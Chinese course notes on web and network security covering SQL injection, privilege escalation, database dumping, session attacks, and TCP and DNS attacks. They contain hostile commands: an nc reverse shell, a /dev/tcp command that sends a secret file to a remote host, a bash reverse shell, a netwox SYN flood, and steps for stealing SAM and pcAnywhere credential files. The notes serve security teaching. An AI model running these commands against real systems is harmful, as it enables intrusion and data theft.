<li><p>系统存储过程：以 sp_ 开头，用来进行系统的各项设定，取得信息，相关管理工作，如 sp_help 就是取得指定对象的相关信息</p>
</li>
<li><p>扩展存储过程：以 XP_ 开头，用来调用操作系统提供的功能</p>
</li>
<li><p>用户自定义的存储过程</p>
</li>
</ul>
<h3 id="类型-1"><a href="#类型-1" class="headerlink" title="类型"></a>类型</h3><p>字符型 SQL 注入</p>
<ul>
<li>SQL 注入点的类型为字符串</li>
<li>与数字型注入的区别：一般要用单引号来闭合<ul>
<li>e.g. <code>http://www.testweb.com/user.php?user=admin&#39; and &#39;1&#39; = &#39;1</code>（本身有一个引号了）</li>
</ul>
</li>
</ul>
<p>数字型 SQL 注入</p>
<ul>
<li><p>SQL 注入点的类型为数字</p>
<ul>
<li><p>输入的参数为整数，如ID、年龄、页码等</p>
<p>e.g. <code>http://www.testweb.com/user.php?id=8 and 1=1</code></p>
</li>
</ul>
</li>
</ul>
<p>基于错误信息的 SQL 注入</p>
<p>SQL 盲注</p>
<ul>
<li><p>为了防止基于错误信息的 SQL 注入，很多 Web 应用会将错误信息关闭，也就是通过网页看不到 Web 应用执行过程中的错误信息了。</p>
</li>
<li><p>SQL 盲注入就是在没有信息提示的情况实现 SQL 注入的方法。</p>
</li>
<li><p>典型的SQL 盲注入一般使用布尔值、时间函数等。</p>
</li>
</ul>
<h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><p>以 ASP + ACCESS 为例：</p>
<ol>
<li>注入点的发现</li>
<li>数据库的类型</li>
<li>猜解表名</li>
<li>猜解字段名</li>
<li>猜解内容</li>
<li>进入管理页面，上传 ASP 木马</li>
</ol>
<h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><p>最简单的提权方法：</p>
<ul>
<li><p>如果服务器上有装了 pcanywhere 服务端（管理员为了管理方便 ，一般的服务器都装了这个远程控制软件）</p>
</li>
<li><p>到系统盘的 DocumentsandSettings&#x2F; AllUsers&#x2F; Application Data&#x2F; Symantec&#x2F; pcAnywhere&#x2F; 中下载 *.cif</p>
</li>
<li><p>本地破解 cif 文件后，使用 pcanywhere 连接就完全控制服务器了。</p>
</li>
</ul>
<p>利用 servu 来提升权限：</p>
<ul>
<li><p>servu 是一个非常好用的 FTP 服务器</p>
</li>
<li><p>需要 servu 安装目录可写</p>
</li>
<li><p>首先通过 webshell 访问 servu 安装文件夹下的 ServUDaemon.ini，把他下载下来</p>
</li>
<li><p>然后在本机上安装一个 servu 把 ServUDaemon.ini 放到本地安装文件夹下覆盖</p>
</li>
<li><p>启动 servu，添加一个用户，设置为系统管理员，目录C:\，具有可执行权限</p>
</li>
<li><p>然后去 servu 安装目录里把 ServUDaemon.ini 更换为服务器上的</p>
</li>
<li><p>seru的提权方法很多，比如本地溢出，vbs 脚本，输入的 asp 提权木马等等</p>
</li>
</ul>
<p>破解管理员密码提权：</p>
<ul>
<li>下载服务器 C:\winnt\system32\config 下的 sam 文件，得到后在本地进行破解，等到服务器的管理员的用户名和密码</li>
</ul>
<p>脚本提权：</p>
<ul>
<li>进入 C:\Documents and Settings\All Users\「开始」菜单\ 程序\ 启动，写入 bat，vbs</li>
</ul>
<p>Nc反向连接：</p>
<ul>
<li><p>如果某个目录有写权限，先上传个 nc 上去</p>
</li>
<li><p>在服务器上执行：</p>
<ul>
<li>nc -e cmd.exe 你的 ip 端口</li>
</ul>
</li>
<li><p>在本地执行：</p>
<ul>
<li>nc -l -p 端口</li>
</ul>
</li>
<li><p>两个端口一样，则会返回远程操作系统的一个 shell</p>
</li>
</ul>
<h3 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h3><p>读取、修改或者删除数据库内的数据，获取数据库中的用户名和密码等敏感信息</p>
<p>获得数据库管理员的权限</p>
<p>如果能够再利用 SQL Server 扩展存储过程和自定义扩展存储过程来执行一些系统命令，攻击者还可以获得该系统的控制权</p>
<p>SQL 注入的隐蔽性：</p>
<ul>
<li>SQL 注入是从正常的 WWW 端口访问，防火墙一般不报警，很难发现</li>
</ul>
<h3 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h3><p>定义：通过一些技术手段或者程序漏洞得到数据库的地址，并将数据非法下载到本地</p>
<p>物理路径与相对路径：</p>
<ul>
<li><p>物理路径（绝对路径）：从根目录开始一直到该目录全程的路径</p>
</li>
<li><p>相对路径：相对于其它目录的路径</p>
</li>
</ul>
<p>黑客可以成功暴库的原因：</p>
<ul>
<li><p>网站制作者的偷懒</p>
</li>
<li><p>IE 与 ASP 程序对特殊字符« \ »解析的不同</p>
</li>
</ul>
<p>暴库手段</p>
<ul>
<li><p>Google hack</p>
</li>
<li><p>%5c 暴库</p>
</li>
</ul>
<p>%5c 暴库原理：</p>
<ul>
<li>数据库链接文件<ul>
<li>一个简短的 ASP 程序，这段程序主要负责在服务器上找到数据库并与之建立连接</li>
<li>通常这个文件名为：conn.asp</li>
</ul>
</li>
</ul>
<p>得到错误信息后如何处理：</p>
<ul>
<li><p>得到数据库名，猜测数据库的真正物理地址</p>
</li>
<li><p>直接下载数据库</p>
</li>
</ul>
<p>注意事项</p>
<ul>
<li><p>IE 设置要将« 显示友好的 HTTP 错误信息 »关闭</p>
</li>
<li><p>对方数据库必须是 ACCESS</p>
</li>
<li><p>需要的是二级目录，一级目录很难成功</p>
</li>
</ul>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>特殊字符转义</p>
<p>输入验证和过滤</p>
<p>参数化方法</p>
<h2 id="HTTP-会话及防御"><a href="#HTTP-会话及防御" class="headerlink" title="HTTP 会话及防御"></a>HTTP 会话及防御</h2><p>HTTP 协议设计之初没有考虑到会话问题，而现在的 Web 应用几乎都包含会话。</p>
<p>后来增加的会话管理机制存在天生不足，并一直伴随着HTTP会话管理技术的发展而不断变化更新。</p>
<p>比较经典的 HTTP 会话攻击技术有：</p>
<ul>
<li>预测会话ID</li>
<li>窃取会话ID</li>
<li>控制会话ID</li>
<li>跨站请求伪造攻击（Cross-Site Request Forgery，CSRF）等</li>
</ul>
<p>HTTP 会话原理：</p>
<img src="D:\PicGo\typoraimage\image-20231225190826101.png" alt="image-20231225190826101" style="zoom: 67%;" />

<p>HTTP 会话示例：</p>
<img src="D:\PicGo\typoraimage\image-20231225192105945.png" alt="image-20231225192105945" style="zoom:67%;" />



<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p><img src="D:\PicGo\typoraimage\image-20231225192159767.png" alt="image-20231225192159767"></p>
<h3 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h3><p>针对预测 会话ID 攻击</p>
<ul>
<li>通常开发者自己实现会话管理机制时，较容易出现 会话ID 被预测的问题</li>
<li>建议采用编程语言内置的会话管理机制，如 PHP 语言、JAVA 语言的会话管理机制等</li>
</ul>
<p>针对窃取会话ID号攻击</p>
<ul>
<li>需要根据不同的窃取 会话ID 方法，采取不同的防范措施</li>
<li>如基于 XSS攻击 实施的 会话ID 窃取攻击，可以采用 HttpOnly 属性的方法来防范</li>
</ul>
<p>针对会话ID固定攻击</p>
<ul>
<li><p>支持会话采纳（Session Adoption）的Web环境，存在 会话ID固定 的风险比较高。</p>
</li>
<li><p>尽可能的采用« 非会话采纳 »的 Web环境 或对会话采纳方式进行防范</p>
</li>
</ul>
<p>针对会话保持攻击</p>
<ul>
<li>主要的防范措施就是不能让 会话ID 长期有效，如采用强制销毁措施或用户登录后更改 会话ID 等</li>
</ul>
<p>针对CSRF攻击</p>
<ul>
<li><p>使用 POST 替代 GET</p>
</li>
<li><p>检验 HTTP referer</p>
</li>
<li><p>验证码</p>
</li>
<li><p>使用Token</p>
</li>
</ul>
<h1 id="假消息攻击"><a href="#假消息攻击" class="headerlink" title="假消息攻击*"></a>假消息攻击*</h1><h2 id="包嗅探与欺骗"><a href="#包嗅探与欺骗" class="headerlink" title="包嗅探与欺骗*"></a>包嗅探与欺骗*</h2><p><em>原理、<strong>攻击思路（TCP 通信代码及流程、IP 欺骗攻击及防范）</strong></em></p>
<h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><p>如何接收数据包：</p>
<ul>
<li><p>NIC（网络接口卡）是机器和网络之间的物理或逻辑链路</p>
</li>
<li><p>每个NIC 都有一个 MAC 地址</p>
</li>
<li><p>网络上的每个 NIC 都将 « 听 » 到线路上的所有帧</p>
</li>
<li><p>NIC 检查每个数据包的目标地址，如果该地址与卡的 MAC 地址匹配，则会进一步复制到内核的缓冲区中</p>
</li>
</ul>
<p>混杂模式：</p>
<ul>
<li><p>未指定给定 NIC 的帧将被丢弃</p>
</li>
<li><p>在混杂模式下运行时，NIC 将从网络接收到的每个帧传递给内核</p>
</li>
<li><p>如果嗅探器程序在内核中注册，它将能够看到所有包</p>
</li>
<li><p>在Wi-Fi中，它被称为监控（monitor）模式</p>
</li>
</ul>
<p>BSD 数据包过滤器（BPF）：</p>
<ul>
<li><p>BPF 让一个用户程序向套接字附加一个过滤器，它告诉内核放弃不想要的数据包。</p>
</li>
<li><p>编译的BPF伪代码可以通过 setsockopt（）附加到套接字</p>
</li>
<li><p>当内核接收到数据包时，BPF 将被调用</p>
</li>
<li><p>一个被接收的数据包被提交到上层协议栈。请参阅下面幻灯片上的图表（带&#x2F; 不带过滤器的数据包流）</p>
<img src="D:\PicGo\typoraimage\image-20231225195308412.png" alt="image-20231225195308412" style="zoom:80%;" /></li>
</ul>
<p>包嗅探：</p>
<ul>
<li>数据包嗅探描述了在实时数据流经网络时捕获这些数据的过程</li>
</ul>
<p>使用套接字接收数据包：</p>
<ol>
<li>创建套接字</li>
<li>提供有关服务器的信息</li>
<li>接收数据包</li>
</ol>
<p>使用原始套接字接收数据包：</p>
<ol>
<li>创建套接字</li>
<li>捕获所有类型的数据包</li>
<li>启用混杂模式</li>
<li>等待数据包</li>
</ol>
<p>Endiannesss（字节序）：</p>
<ul>
<li><p>Endianness：一个术语，指给定多字节数据项在内存中的存储顺序。</p>
</li>
<li><p>Little-Endian：将数据的最高有效字节存储在高地址</p>
</li>
<li><p>Big-Endian：将数据的最高有效字节存储在最低地址</p>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231226163354442.png" alt="image-20231226163354442" style="zoom: 80%;" />

<p>不同字节顺序的计算机会相互« 误解 »。</p>
<ul>
<li><p>解决方案：商定沟通的共同顺序</p>
</li>
<li><p>这被称为« 网络字节序 »，与大端字节序相同</p>
</li>
</ul>
<p>所有计算机都需要在« 主机字节序 »和« 网络字节序 »之间转换数据。</p>
<img src="D:\PicGo\typoraimage\image-20231226163546370.png" alt="image-20231226163546370" style="zoom:50%;" />









<h3 id="数据包欺骗"><a href="#数据包欺骗" class="headerlink" title="数据包欺骗"></a>数据包欺骗</h3><p>当数据包中的某些关键信息被伪造时，我们称之为数据包欺骗。</p>
<p>许多网络攻击依赖于数据包欺骗。</p>
<p>数据包欺骗有两个主要步骤：</p>
<ul>
<li><p>构造数据包</p>
</li>
<li><p>把包发送出去</p>
</li>
</ul>
<p>嗅探然后欺骗：</p>
<p>在许多情况下，我们需要先捕获数据包，然后根据捕获的数据包伪造响应。</p>
<p>过程（以UDP为例）：</p>
<ul>
<li><p>使用 PCAP API 捕获感兴趣的数据包</p>
</li>
<li><p>从 Captured Package 中复制一份</p>
</li>
<li><p>用新消息替换 UDP 数据字段，并交换源和目标字段</p>
</li>
<li><p>发出欺骗的答复</p>
</li>
</ul>
<p>Scapy 与 C 比较：</p>
<p>Python+Scapy：</p>
<ul>
<li><p>优点：构造数据包非常简单</p>
</li>
<li><p>缺点：比C代码慢得多</p>
</li>
</ul>
<p>C程序（使用原始套接字）：</p>
<ul>
<li><p>优点：快得多</p>
</li>
<li><p>缺点：构造数据包很复杂</p>
</li>
</ul>
<p>混合方法：</p>
<ul>
<li><p>使用 scapy 构造数据包</p>
</li>
<li><p>使用 C 稍微修改数据包，然后发送数据包</p>
</li>
</ul>
<h2 id="TCP-攻击"><a href="#TCP-攻击" class="headerlink" title="TCP 攻击*"></a>TCP 攻击*</h2><p><em>什么是TCP协议<strong>（TCP协议的工作原理、SYN flooding攻击原理及步骤、TCP 重置攻击原理及步骤、TCP 会话劫持攻击原理及步骤）</strong></em></p>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="TCP协议的工作原理"><a href="#TCP协议的工作原理" class="headerlink" title="TCP协议的工作原理"></a>TCP协议的工作原理</h4><p>传输控制协议（TCP）是 Internet 协议套件的核心协议。</p>
<p>位于 IP 层的顶部：传输层。</p>
<p>为应用程序提供« 主机到主机 »的通信服务。</p>
<p>两个传输层协议：</p>
<ul>
<li><p>TCP：在应用程序之间提供可靠且有序的通信通道。</p>
</li>
<li><p>UDP：具有较低开销的轻量级协议，可用于不需要可靠性或通信顺序的应用程序。</p>
</li>
</ul>
<p>TCP客户端程序：</p>
<ol>
<li><p>创建 socket；指定通信的类型。</p>
<ul>
<li>TCP 使用 SOCK_STRAEAM，UDP 使用 SOCK_DGRAM</li>
</ul>
</li>
<li><p>启动 TCP 连接</p>
</li>
<li><p>发送数据</p>
</li>
</ol>
<p>TCP服务器程序：</p>
<ol>
<li><p>创建一个套接字</p>
<ul>
<li>与客户端程序相同</li>
</ul>
</li>
<li><p>绑定到端口号</p>
<ul>
<li><p>通过网络与其他人通信的应用程序需要在其主机上注册端口号</p>
</li>
<li><p>当数据包到达时，操作系统根据端口号知道哪个应用程序是接收器</p>
</li>
<li><p>服务器需要告诉操作系统它正在使用哪个端口</p>
</li>
<li><p>这是通过 bind() 系统调用完成的</p>
</li>
</ul>
</li>
<li><p>侦听连接</p>
<ul>
<li><p>设置套接字后，TCP 程序调用 listen() 以等待连接</p>
</li>
<li><p>它告诉系统它已准备好接收连接请求</p>
</li>
<li><p>一旦收到连接请求，操作系统将通过三方握手建立连接</p>
</li>
<li><p>已建立的连接放置在队列中，等待应用程序接收它</p>
</li>
</ul>
</li>
<li><p>接收连接请求</p>
<ul>
<li>建立连接后，应用程序需要« 接收 »连接才能访问它</li>
<li>accept() 系统调用从队列中提取第一个连接请求，创建一个新套接字，并返回引用该套接字的文件描述符</li>
</ul>
</li>
<li><p>发送和接收数据</p>
<ul>
<li>一旦建立并接受了连接，双方都可以使用这个新的套接字发送和接收数据</li>
</ul>
</li>
</ol>
<p>PS：如果要接收多个连接：</p>
<ul>
<li>fork() 系统调用通过复制调用进程来创建新进程</li>
<li>成功时，子进程的进程ID在父进程中返回，在子进程中返回0</li>
</ul>
<p>数据传输</p>
<p>一旦建立连接，操作系统在每一端分配两个缓冲区，一个用于发送数据（发送缓冲区）和接收缓冲区（接收缓冲区）。</p>
<p>当应用程序需要发送数据时，它会将数据放入TCP发送缓冲区。</p>
<img src="D:\PicGo\typoraimage\image-20231226171432120.png" alt="image-20231226171432120" style="zoom: 67%;" />

<p>发送缓冲区中的每个字节（8bit）在报头中都有一个序列号字段，用于指示数据包的序列。</p>
<p>在接收端，这些序列号用于将数据放置在接收缓冲区内的正确位置。</p>
<p>一旦数据被放入接收缓冲区，它们就被合并到一个数据流中。</p>
<p>应用程序从接收缓冲区读取数据：</p>
<ul>
<li>如果没有可用的数据，它通常会被锁定</li>
<li>当有足够的数据可读取时，它将被解除阻止</li>
</ul>
<p>接收方使用确认包（ACK）通知发送方接收的数据。</p>
<p>TCP报头：</p>
<p>TCP段：TCP头+数据</p>
<ul>
<li><p>源端口和目标端口：</p>
<ul>
<li>每个16 bit</li>
<li>指定发送方和接收方的端口号</li>
</ul>
</li>
<li><p>序列号：</p>
<ul>
<li>32 bit</li>
<li>指定TCP段中第一个八位字节的序列号</li>
<li>如果设置了SYN位，则为初始序列号</li>
</ul>
</li>
<li><p>确认号：</p>
<ul>
<li>32 bit</li>
<li>包含此段发送方期望的下一个序列号的值</li>
<li>如果设置了ACK位，则有效</li>
</ul>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231226172025483.png" alt="image-20231226172025483" style="zoom: 67%;" />

<ul>
<li><p>头长度：</p>
<ul>
<li>4 bit</li>
<li>TCP头的长度是通过头中32位字的数量来测量的</li>
<li>所以我们乘以4得到头中的八位字节数</li>
</ul>
</li>
<li><p>保留：</p>
<ul>
<li>6 bit</li>
<li>不使用此字段</li>
</ul>
</li>
<li><p>代码位</p>
<ul>
<li>6 bit</li>
<li>有六个代码位，包括 SYN、FIN、ACK、RST、PSH 和 URG</li>
</ul>
</li>
<li><p>窗口</p>
<ul>
<li>16 bit</li>
<li>用于指定此 TCP 段的发送方愿意接受的八位字节数</li>
<li>此字段用于流量控制</li>
</ul>
</li>
<li><p>校验和：</p>
<ul>
<li>16 bit</li>
<li>使用部分IP头、TCP头和TCP数据计算</li>
</ul>
</li>
<li><p>紧急指针：</p>
<ul>
<li>16 bit</li>
<li>如果设置了URG代码位，则数据的第一部分包含紧急数据（不使用序列号）</li>
<li>紧急指针指定紧急数据结束和正常TCP数据开始的位置</li>
<li>紧急数据用于优先目的，因为它们不会在接收缓冲区中排队等待，并将立即交付给应用程序</li>
</ul>
</li>
<li><p>选项：</p>
<ul>
<li>0~320 bit，可被32整除</li>
<li>TCP段可以携带可变长度的选项，这些选项提供了一种处理原始标头限制的方法。</li>
</ul>
</li>
</ul>
<p>TCP 三次握手协议</p>
<p>SYN包：</p>
<ul>
<li>客户端使用随机生成的数字 x 作为其序列号，向服务器发送一个名为 SYN 的特殊数据包。</li>
</ul>
<p>SYN ACK数据包：</p>
<ul>
<li>在接收到它时，服务器使用自己随机生成的数字 y 作为序列号发送应答包。</li>
</ul>
<p>ACK包：</p>
<ul>
<li>客户端发送 ACK 数据包以结束握手。</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231226172820159.png" alt="image-20231226172820159" style="zoom:50%;" />

<p>当服务器接收到初始 SYN 数据包时，它使用 TCB（传输控制块）存储有关连接的信息。</p>
<p>这称为半开放连接，因为只确认了客户端-服务器连接。</p>
<p>服务器将 TCB 存储在仅用于半开放连接的队列中。</p>
<p>在服务器获得ACK数据包后，它将把这个 TCB 从队列中取出并存储在另一个地方。</p>
<p>如果 ACK 没有到达，服务器将重新发送 SYN+ACK 数据包。一段时间后，TCB 最终将被丢弃。</p>
<h3 id="SYN-Flooding-攻击"><a href="#SYN-Flooding-攻击" class="headerlink" title="SYN Flooding 攻击"></a>SYN Flooding 攻击</h3><p>想法：为了填充存储半开放连接的队列，以便没有空间为任何新的半开放连接存储TCB，基本上服务器不能接受任何新的SYN数据包。</p>
<p>实现这一点的步骤：持续向服务器发送大量SYN数据包。这会通过插入TCB记录来消耗队列中的空间。</p>
<p>不要完成握手的第三步，因为这将使 TCB 记录从队列中被取出。</p>
<img src="D:\PicGo\typoraimage\image-20231226173800586.png" alt="image-20231226173800586" style="zoom: 50%;" />

<p>当向服务器发送 SYN 数据包时，我们需要使用随机 源IP 地址；否则，攻击可能会被防火墙阻止。</p>
<p>服务器发送的 SYN+ACK 数据包可能会被丢弃，因为伪造的 IP地址 可能不会分配给任何机器。</p>
<p>如果到达现有机器，RST包 将被发送，TCB 将被平衡。</p>
<p>由于第二种选择不太可能发生，TCB 记录将大部分保留在队列中。这导致了 SYN Flooding 攻击。</p>
<p>攻击过程：</p>
<ol>
<li><p>检查 TCP状态：</p>
<ul>
<li><p>LISTEN：等待 TCP连接</p>
</li>
<li><p>ESTABLISHED：完成三次握手</p>
</li>
<li><p>SYN_RECV：半开放式连接</p>
</li>
</ul>
</li>
<li><p>关闭 同步Cookie政策：</p>
<ul>
<li><code>$sudo sysctl -w net.ipv4.tcp_syncookies=0</code></li>
</ul>
</li>
<li><p>使用 NetWox 发起攻击：</p>
<ul>
<li><code>sudo netwox 76 -i 10.0.2.7 -p 23 -s raw</code></li>
<li>23是telnet服务器的端口</li>
</ul>
</li>
</ol>
<p>结果：</p>
<p>使用 netstat 命令：</p>
<ul>
<li>在端口23上有大量半开放的连接，带有 随机源IP。</li>
</ul>
<p>使用top命令：</p>
<ul>
<li>服务器上的CPU使用率不高。</li>
<li>服务器处于活动状态，可以正常执行其他功能，但不能仅接受 telnet连接。</li>
</ul>
<p>PS：我们还可以编写代码来伪造 IP SYN数据包。</p>
<p>防范策略：</p>
<p>SYN cookies</p>
<ul>
<li><p>在服务器接收到 SYN 数据包后，它使用只有服务器知道的密钥从数据包中的信息计算密钥散列（H）。</p>
</li>
<li><p>此哈希（H）作为初始序列号从服务器发送到客户端。H 称为 SYN cookie。</p>
</li>
<li><p>服务器不会将半开放连接存储在其队列中。</p>
</li>
<li><p>如果客户端是攻击者，H 将无法到达攻击者。</p>
</li>
<li><p>如果客户端不是攻击者，则在确认字段中输入 H+1。</p>
</li>
<li><p>服务器通过重新计算 cookie 来检查确认字段中的数字是否有效。</p>
</li>
</ul>
<h3 id="TCP-重置攻击"><a href="#TCP-重置攻击" class="headerlink" title="TCP 重置攻击"></a>TCP 重置攻击</h3><p>要断开TCP连接，需要执行以下操作：</p>
<ul>
<li><p>A 向 B 发送一个 FIN 数据包</p>
</li>
<li><p>B 用 ACK 数据包进行回复。</p>
</li>
<li><p>现在，B 向 A 发送一个 FIN 数据包，A 回复 ACK</p>
</li>
</ul>
<p>使用重置标志：</p>
<ul>
<li>通信一方发送 RST 包则立即断开连接。</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231226175431123.png" alt="image-20231226175431123" style="zoom: 50%;" />





<p>重置攻击：</p>
<p>目标：断开 A 和 B 之间的 TCP连接。</p>
<img src="D:\PicGo\typoraimage\image-20231226175602661.png" alt="image-20231226175602661" style="zoom:50%;" />

<p>伪造的 RST 数据包，需要正确设置以下字段：</p>
<ul>
<li><p>源IP地址，源端口</p>
</li>
<li><p>DestinationIP，DestinationPort</p>
</li>
<li><p>Sequencenumber（在接收器窗口内）</p>
</li>
</ul>
<p>SSH 连接上的 TCP 重置攻击：</p>
<p>如果加密是在网络层完成的，则包括包头在内的整个 TCP数据包 都将被加密，这使得嗅探或欺骗变得不可能。</p>
<p>但由于 SSH 在传输层进行加密，TCP包头 仍然未加密。因此，攻击是成功的，因为 RST数据包 只需要包头。</p>
<p>对视频流连接的 TCP重置攻击：</p>
<p>此攻击与以前的攻击类似，只是序列号不同，因为在本例中，序列号增长非常快，不像 Telnet攻击，因为我们没有在终端中键入任何内容。</p>
<p>为此，我们使用 NetWox 78 工具重置来自用户机器的每个数据包。如果用户正在观看视频，则来自用户机器的任何请求都将用 RST数据包 进行响应。</p>
<p>注意：如果 RST数据包 连续发送到服务器，则行为可疑，可能会触发对用户采取的一些惩罚措施。</p>
<h3 id="TCP-会话劫持攻击"><a href="#TCP-会话劫持攻击" class="headerlink" title="TCP 会话劫持攻击"></a>TCP 会话劫持攻击</h3><p>目标：在已建立的连接中注入数据。</p>
<img src="D:\PicGo\typoraimage\image-20231226180544867.png" alt="image-20231226180544867" style="zoom:50%;" />

<p>伪造 TCP数据包，需要正确设置以下字段：</p>
<ul>
<li><p>源IP地址，源端口，</p>
</li>
<li><p>目标IP地址，目标端口</p>
</li>
<li><p>序列号（在接收器窗口内）</p>
</li>
</ul>
<p>序列号：</p>
<p>如果接收器已接收到 序列号x 之前的一些数据，则下一个序列号为 x+1。</p>
<p>如果伪造的数据包使用 序列号x+𝛿，会导致一些问题：</p>
<ul>
<li><p>数据包中的数据将被接收方存储在缓冲区的位置 x+𝛿 处。</p>
<ul>
<li>这会导致接收方的 TCP缓冲区 中出现不连续的数据存储，而不是按照预期的顺序存储。</li>
</ul>
</li>
<li><p>如果𝛿太大，超出了接收方缓冲区的边界</p>
<ul>
<li>这可能导致数据包中的数据无法被正确存储，甚至可能导致缓冲区溢出或其他异常情况。</li>
</ul>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231226181428953.png" alt="image-20231226181428953" style="zoom:50%;" />





<p>劫持之后运行什么命令：</p>
<p>考虑服务器上用户帐户中有一个名为 secret 的绝密文件。</p>
<p>如果攻击者使用 cat 命令，结果将显示在服务器的主机上，而不是攻击者的机器上。</p>
<p><code>cat /home/seed/secret &gt; /dev/tcp/10.0.2.70/9090</code></p>
<p>cat 命令打印出机密文件的内容，但不是在本地打印，而是将输出重定向到名为&#x2F;dev&#x2F;tcp&#x2F;10.0.2.16&#x2F;9090的文件（包含设备文件的 &#x2F;dev文件夹 中的虚拟文件）。</p>
<p>这将调用一个伪设备，该设备创建与 TCP服务器 的连接，TCP服务器在 10.0.2.16 的 端口9090 上侦听，并通过该连接发送数据。</p>
<p>创建 反向Shell：</p>
<p>劫持连接后运行的最佳命令是运行 反向shell命令。</p>
<p>在服务器上运行 shell程序，如 &#x2F;bin&#x2F;bash，并使用可由攻击者控制的 输入&#x2F;输出 设备。</p>
<p>shell程序 使用 TCP连接 的一端作为其 输入&#x2F;输出，连接的另一端由攻击者计算机控制。</p>
<p>反向shell 是一个在远程计算机上运行的shell进程，可连接回攻击者。</p>
<p><code>/bin/bash -i &gt; /dev/tcp/10.0.2.70/9090 2&gt;&amp;1 0&lt;&amp;1</code></p>
<ul>
<li><p>-i 代表交互式，这意味着 shell 应该是交互式的。</p>
</li>
<li><p>使 shell的输出 重定向到 TCP连接 10.0.2.70 的端口9090 上。</p>
</li>
<li><p>文件描述符2 表示标准错误（stderr）。</p>
<ul>
<li>这种情况下，错误输出将被重定向到 stdout，即 TCP连接。</li>
</ul>
</li>
<li><p>文件描述符0 表示标准输入设备（stdin），1表示标准输出设备（stdout）。</p>
<ul>
<li>由于 stdout 已重定向到 TCP连接，因此此选项基本上表示 shell程序 将从同一TCP连接获取其输入。</li>
</ul>
</li>
</ul>
<p>防御会话劫持：</p>
<ul>
<li><p>使攻击者难以伪造数据包</p>
<ul>
<li><p>随机化源端口号</p>
</li>
<li><p>随机化初始序列号</p>
</li>
<li><p>对本地攻击无效</p>
</li>
</ul>
</li>
<li><p>加密有效载荷</p>
</li>
</ul>
<h2 id="DNS-攻击"><a href="#DNS-攻击" class="headerlink" title="DNS 攻击*"></a>DNS 攻击*</h2><p><em>DNS攻击<strong>（域名结构、查询过程、DNS攻击类型及原理（本地DNS缓存中毒攻击、远程DNS缓存中毒攻击、恶意DNS服务器的回复伪造攻击、DNS重绑定攻击)、范措措施）</strong></em></p>
<h3 id="域名结构"><a href="#域名结构" class="headerlink" title="域名结构"></a>域名结构</h3><img src="D:\PicGo\typoraimage\image-20231226182917375.png" alt="image-20231226182917375" style="zoom: 80%;" />

<p>二级域通常分配给特定实体：如公司、学校</p>
<p>区域（zone）：</p>
<p>DNS 是根据 区域 组织的。</p>
<p>区域是指 DNS服务器 上的一个独立管理区域，包含了一部分域名空间的信息。</p>
<p>区域将相邻的域和子域分组，并将管理权限分配给实体。</p>
<p>下图使用树结构来描述 example.com 域中的子域。</p>
<p>在这种情况下，每个国家有多个 DNS 区域。这些区域保留其每个子域的权限记录。</p>
<p>区域 example.com 仅包含不属于任何子域的主机名的 DNS 记录，如 mail.example.com</p>
<img src="D:\PicGo\typoraimage\image-20231226183209483.png" alt="image-20231226183209483" style="zoom:80%;" />

<p>区域（zone）和域（domain）：</p>
<p>DNS区域仅包含域的一部分DNS数据。</p>
<p>如果域未划分为子域，则区域和域本质上是相同的，因为区域包含域的所有DNS数据。</p>
<p>当一个域被划分为子域时，它们的DNS数据仍然可以放在同一个区域中，因此域和区域仍然是相同的。</p>
<p>但是子域可以有自己的区域。</p>
<p>例如上图：</p>
<ul>
<li>usa.example.com 是一个域名，其子域为 boston、chicago、nyc</li>
<li>example.com 的域名管理者为 usa.example.com 创建了两个区域</li>
<li>第一个包含 usa域、chicago 和 boston子域，第二个包含 nyc子域</li>
</ul>
<p>根服务器：</p>
<ul>
<li><p>根区域称为 root</p>
</li>
<li><p>此区域有13个权威名称服务器（DNS根服务器）</p>
</li>
<li><p>它们提供有关所有TLD的名称服务器信息</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.internic.net/domain/root.zone">https://www.internic.net/domain/root.zone</a></li>
</ul>
</li>
<li><p>它们是DNS查询的起点</p>
</li>
</ul>
<p>权威名称服务器：</p>
<ul>
<li><p>每个 DNS区域 至少有一个权威名称服务器，用于发布有关该区域的信息。</p>
</li>
<li><p>它提供了 DNS查询 的原始和最终答案。</p>
</li>
<li><p>权威名称服务器可以是主服务器（主服务器）或从服务器（辅助服务器）。</p>
</li>
<li><p>主服务器存储所有区域记录的主副本，而从服务器使用自动更新机制来维护主记录的相同副本。</p>
</li>
</ul>
<h3 id="查询过程"><a href="#查询过程" class="headerlink" title="查询过程"></a>查询过程</h3><p>递归查询：如果 A 请求 B，那么 B 作为请求的接收者一定要给 A 想要的答案</p>
<p><img src="D:\PicGo\typoraimage\image-20231226193330485.png" alt="image-20231226193330485"></p>
<p>迭代查询：如果接收者 B 没有请求者 A 所需要的准确内容，接收者 B 将告诉请求者 A，如何去获得这个内容，但是自己并不去发出请求</p>
<p><img src="D:\PicGo\typoraimage\image-20231226193441677.png" alt="image-20231226193441677"></p>
<p>PS：权限域即权威域（Authoritative Domain）</p>
<p>DNS响应：</p>
<p>DNS响应一般包含：</p>
<ul>
<li><p>Header（标头）</p>
<ul>
<li>响应的一般信息<ul>
<li>如标识响应类型（查询响应、授权响应等）</li>
<li>回答数量</li>
<li>授权数量</li>
<li>附加数量等。</li>
</ul>
</li>
</ul>
</li>
<li><p>Question Section（问题部分）</p>
<ul>
<li>原始查询的问题信息<ul>
<li>如查询的域名</li>
<li>查询类型（A记录、MX记录等）</li>
<li>查询类别（通常是IN，表示Internet类别）</li>
</ul>
</li>
</ul>
</li>
<li><p>Answer Section（回答部分）</p>
<ul>
<li>回答问题的记录<ul>
<li>比如IP地址</li>
